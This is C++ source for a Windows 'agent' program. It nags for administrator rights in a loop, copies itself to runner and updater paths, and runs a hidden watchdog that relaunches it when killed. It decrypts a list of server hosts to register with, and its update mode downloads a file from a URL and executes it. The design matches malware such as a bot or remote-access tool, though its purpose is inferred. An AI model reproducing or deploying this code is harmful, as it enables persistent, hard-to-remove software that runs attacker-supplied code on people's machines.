#include "stdafx.h"
#include "Registry.h"
#include "ActiveAgent.h"
#include <sstream>
#include <fstream>
#include <cpprest/http_client.h>
#include <cpprest/filestream.h>
#include <cpprest/json.h>
#include <shlobj.h>
#include <ctime>
#include <ShellAPI.h>
#include <stdio.h>
#include <time.h>
#include <chrono>
#include <urlmon.h>
#include <Iphlpapi.h>
#include <Assert.h>
#include <future>
#include "Tools.h"
#include "Connection.h"
#include "Stub.h"
#include "Encrypt.h"

using namespace std::chrono;
using namespace std;
using namespace web;
using namespace web::http;
using namespace web::http::client;
using namespace utility;

#define MAX_LOADSTRING 100
HINSTANCE hInst;
WCHAR szTitle[MAX_LOADSTRING];
WCHAR szWindowClass[MAX_LOADSTRING];

int
timeout = 20000,
source_timeout = 3000,
counter = 0,
runKeeperTimeout = 200;

bool
UpdateTime = false,
readyToUpdate = false;

bool initClient();

wstring
current_source,
mutex_key = L"YZNA175IapGqBmBSJq17JG" + std::to_wstring(agent_id) + L"_" + std::to_wstring(agent_file_version);

HANDLE mutex_handle;
SHELLEXECUTEINFO RunKeeperExecInfo = { 0 };

void KeepRun() {
	while (true) {

		if (UpdateTime) {
			return;
		}

		HANDLE h = RunKeeperExecInfo.hProcess;

		if (h != NULL) {
			WaitForSingleObject(h, INFINITE);

			DWORD exit_code;
			if (FALSE == GetExitCodeProcess(h, &exit_code))
			{
#if _MOD_DEV
				Tools::WriteLog(L"GetExitCodeProcess() failure: ");
#endif
			}
			else if (STILL_ACTIVE == exit_code)
			{
#if _MOD_DEV
				Tools::WriteLog(L"Still running");
#endif
			}
			else
			{
				TerminateProcess(h, 1);
				RunKeeperExecInfo = { 0 };
			}
		}
		else {
			auto pid = GetCurrentProcessId();
			RunKeeperExecInfo.cbSize = sizeof(RunKeeperExecInfo);
			RunKeeperExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			RunKeeperExecInfo.hwnd = 0;
			RunKeeperExecInfo.lpVerb = L"runas";
			RunKeeperExecInfo.lpFile = runner_path.c_str();
			wstring params = L"-r " + std::to_wstring(pid) + L" " + Tools::getExePath();
			RunKeeperExecInfo.lpParameters = params.c_str();
			RunKeeperExecInfo.lpDirectory = 0;
			RunKeeperExecInfo.nShow = SW_HIDE;
			RunKeeperExecInfo.hInstApp = 0;
			ShellExecuteEx(&RunKeeperExecInfo);
		}

	}
}
void CheckRun(int pid, const wchar_t* path) {

	while (true) {

		HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
		if (h != NULL) {
			WaitForSingleObject(h, INFINITE);

			DWORD exit_code;
			if (FALSE == GetExitCodeProcess(h, &exit_code))
			{

#if _MOD_DEV
				Tools::WriteLog(L"GetExitCodeProcess() failure: ");
#endif

			}
			else if (STILL_ACTIVE == exit_code)
			{
#if _MOD_DEV
				Tools::WriteLog(L"Still running");
#endif
			}
			else
			{
				RunKeeperExecInfo.cbSize = sizeof(RunKeeperExecInfo);
				RunKeeperExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
				RunKeeperExecInfo.hwnd = 0;
				RunKeeperExecInfo.lpVerb = L"runas";
				RunKeeperExecInfo.lpFile = path;
				wstring params = L"";
				RunKeeperExecInfo.lpParameters = params.c_str();
				RunKeeperExecInfo.lpDirectory = 0;
				RunKeeperExecInfo.nShow = SW_HIDE;
				RunKeeperExecInfo.hInstApp = 0;
				if (ShellExecuteEx(&RunKeeperExecInfo))
				{
					return;

				}
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

#if _MOD_PROD
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	const wchar_t*  exePath = Tools::getExePath();
#if _ENABLE_Elevated
	if (!Tools::IsElevated()) {
		while (true) {
			if (Tools::runExe(exePath, false))
			{
				return 808;
			}
		}
	}
	else {
#endif
		LPWSTR *szArgList;
		int argCount;
		szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
		if (szArgList != NULL)
		{
			for (int i = 0; i < argCount; i++)
			{

				if (std::wstring(szArgList[i]) == L"-r") {
#if _MOD_DEV
					Tools::WriteLog(L"I'm KeepRunner!");
#endif
					int pid = std::stoi(szArgList[i + 1]);
					wstring path = std::wstring(szArgList[i + 2]);
					CheckRun(pid, path.c_str());
					return 100;
					exit(999);
				}

				if (std::wstring(szArgList[i]) == L"-u") {
#if _MOD_DEV
					Tools::WriteLog(L"I'm Updater!");
#endif
					wstring url = std::wstring(szArgList[i + 1]);
					wstring path = std::wstring(szArgList[i + 2]);

#if _MOD_DEV
					Tools::WriteLog(L"URL: " + url);
#endif
#if _MOD_DEV
					Tools::WriteLog(L"DIR: " + path);
#endif

					while (true) {
#if _MOD_DEV
						Tools::WriteLog(L"Starting Download...");
#endif
						if (Tools::DownloadFile(url.c_str(), path.c_str())) {
#if _MOD_DEV
							Tools::WriteLog(L"Download Complete!");
#endif
#if _MOD_DEV
							Tools::WriteLog(L"Running New Agent and terminating updater!");
#endif
							if (Tools::runExe(path.c_str(), true)) {
								return 100;
								exit(999);
							}
							else {
#if _MOD_DEV
								Tools::WriteLog(L"Can't Run downloaded file!");
#endif
							}
						}
#if _MOD_DEV
						Tools::WriteLog(L"Retrying download and run!");
#endif
						Sleep(20000);
					}
					return 100;
					exit(999);
				}
#if _MOD_DEV
				Tools::WriteLog(L"ArgV: " + std::wstring(szArgList[i]));
#endif

			}
		}

		mutex_handle = CreateMutex(NULL, TRUE, mutex_key.c_str());
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			return FALSE;
		}

		CopyFile(Tools::getExePath(), runner_path.c_str(), false);
		CopyFile(Tools::getExePath(), updater_path.c_str(), false);

#if _ENABLE_RunKeeper
		auto KeepRunner = std::async(std::launch::async, KeepRun);
#endif

		int i = 0;
		vector<wstring> source_decrypted = Encrypt::DecryptSources();

		while (i < source_decrypted.size())
		{
			auto source = http_prefix + wstring(source_decrypted[i]) + L"/" + _REST_API_URI + L"/" + _REST_API_VERSION;
			current_source = source;

			while (true) {
#if _ENABLE_initClient
				try {
					if (!initClient())
						break;
				}
				catch (exception e) {
#if _MOD_DEV
					Tools::WriteLog(L"Can't init Client.");
#endif
				}
#endif
#if _MOD_DEV
				Tools::WriteLog(L"Waiting " + to_wstring(timeout) + L" millisecconds...");
#endif
				Sleep(timeout);
			}
			i++;

			if (i == source_decrypted.size())
				i = 0;

#if _MOD_DEV
			Tools::WriteLog(L"Waiting " + to_wstring(source_timeout) + L" secconds...");
#endif
			Sleep(source_timeout);
		}
#if _ENABLE_Elevated
	}
#endif
}
#endif

#if _MOD_CRYPT
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	Encrypt::start();
}
#endif

#if _MOD_DECRYPT
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	Encrypt::DecryptSources();
}
#endif

bool initClient() {

#if _MOD_DEV
	Tools::WriteLog(L"Calling JSON.");
#endif
#if _MOD_DEV
	Tools::WriteLog(L"Source: " + current_source);
#endif
	Connection connection(current_source);

#if _ENABLE_GetClientData
	auto client = connection.GetClientData();

	client.wait();
	if (client.get() == 1) {
		return true;
	}
#endif

#if _ENABLE_PostClientData
#if _MOD_DEV
	Tools::WriteLog(L"Client not found!");
#endif
	auto newClient = connection.PostClientData();
	newClient.wait();
	if (newClient.get()) {
#if _MOD_DEV
		Tools::WriteLog(L"Client signed.");
#endif
		return true;
	}
#endif
	return false;
}